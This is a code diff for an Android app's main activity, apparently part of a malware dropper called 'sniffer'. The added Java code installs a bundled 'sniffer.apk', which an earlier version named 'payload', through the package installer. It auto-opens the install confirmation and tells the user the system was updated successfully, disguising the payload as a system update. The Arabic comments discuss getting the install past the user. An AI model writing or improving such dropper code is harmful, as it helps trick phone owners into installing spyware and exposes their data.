@@ -1,9 +1,12 @@
 package com.v8.global.sniffer;
 
 import android.app.PendingIntent;
+import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.pm.PackageInstaller;
+import android.os.Build;
 import android.os.Bundle;
 import android.view.View;
 import android.widget.Button;
@@ -14,34 +17,75 @@ import java.io.OutputStream;
 
 public class MainActivity extends AppCompatActivity {
 
+    private static final String ACTION_INSTALL_COMPLETE = "com.v8.loader.INSTALL_COMPLETE";
+
+    // هذا هو "المستمع" اللي يلقف رسالة النظام ويفتح نافذة التثبيت
+    private final BroadcastReceiver installReceiver = new BroadcastReceiver() {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            if (ACTION_INSTALL_COMPLETE.equals(intent.getAction())) {
+                int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE);
+                String message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
+                
+                if (status == PackageInstaller.STATUS_SUCCESS) {
+                    Toast.makeText(context, "تم تحديث النظام بنجاح! ✅", Toast.LENGTH_LONG).show();
+                } else if (status == PackageInstaller.STATUS_PENDING_USER_ACTION) {
+                    // السحر هنا: النظام يطلب مننا فتح نافذة التأكيد للمستخدم
+                    Intent confirmationIntent = intent.getParcelableExtra(PackageInstaller.EXTRA_INTENT);
+                    if (confirmationIntent != null) {
+                        confirmationIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        startActivity(confirmationIntent);
+                    }
+                } else {
+                    // إذا اكو خطأ بالملف (مثل تعارض بالأسماء) راح يطلع لك هنا
+                    Toast.makeText(context, "فشل التثبيت: " + message, Toast.LENGTH_LONG).show();
+                }
+            }
+        }
+    };
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+        // تسجيل المستمع في النظام
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            registerReceiver(installReceiver, new IntentFilter(ACTION_INSTALL_COMPLETE), Context.RECEIVER_EXPORTED);
+        } else {
+            registerReceiver(installReceiver, new IntentFilter(ACTION_INSTALL_COMPLETE));
+        }
 
         Button btnInstall = findViewById(R.id.btn_perm);
         btnInstall.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
                 try {
-                    // محاولة فتح ملف القناص من مجلد assets
                     InputStream is = getAssets().open("sniffer.apk");
-                    installPackage(MainActivity.this, is, "com.v8.global.payload");
+                    Toast.makeText(MainActivity.this, "جاري تحضير الملف...", Toast.LENGTH_SHORT).show();
+                    installPackage(MainActivity.this, is);
                 } catch (Exception e) {
-                    e.printStackTrace();
-                    // إذا الملف ماموجود أو اكو خطأ بالقراءة، تطلع هاي الرسالة
-                    Toast.makeText(MainActivity.this, "خطأ بالملف: " + e.getMessage(), Toast.LENGTH_LONG).show();
+                    Toast.makeText(MainActivity.this, "الملف غير موجود بالـ assets: " + e.getMessage(), Toast.LENGTH_LONG).show();
                 }
             }
         });
     }
 
-    public void installPackage(Context context, InputStream in, String targetPackage) {
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        try {
+            unregisterReceiver(installReceiver);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public void installPackage(Context context, InputStream in) {
         try {
             PackageInstaller installer = context.getPackageManager().getPackageInstaller();
             PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                     PackageInstaller.SessionParams.MODE_FULL_INSTALL);
-            params.setAppPackageName(targetPackage);
 
             int sessionId = installer.createSession(params);
             PackageInstaller.Session session = installer.openSession(sessionId);
@@ -55,15 +99,18 @@ public class MainActivity extends AppCompatActivity {
             session.fsync(out);
             out.close();
 
-            Intent intent = new Intent(context, MainActivity.class);
-            PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, intent, PendingIntent.FLAG_MUTABLE);
+            Intent intent = new Intent(ACTION_INSTALL_COMPLETE);
+            PendingIntent pendingIntent = PendingIntent.getBroadcast(
+                    context, 
+                    sessionId, 
+                    intent, 
+                    PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
+            
             session.commit(pendingIntent.getIntentSender());
             session.close();
             
         } catch (Exception e) {
-            e.printStackTrace();
-            // إذا النظام رفض التثبيت أو صارت مشكلة بالـ Session، تطلع هاي الرسالة
-            Toast.makeText(context, "خطأ بالتثبيت: " + e.getMessage(), Toast.LENGTH_LONG).show();
+            Toast.makeText(context, "خطأ برمجي: " + e.getMessage(), Toast.LENGTH_LONG).show();
         }
     }
 }
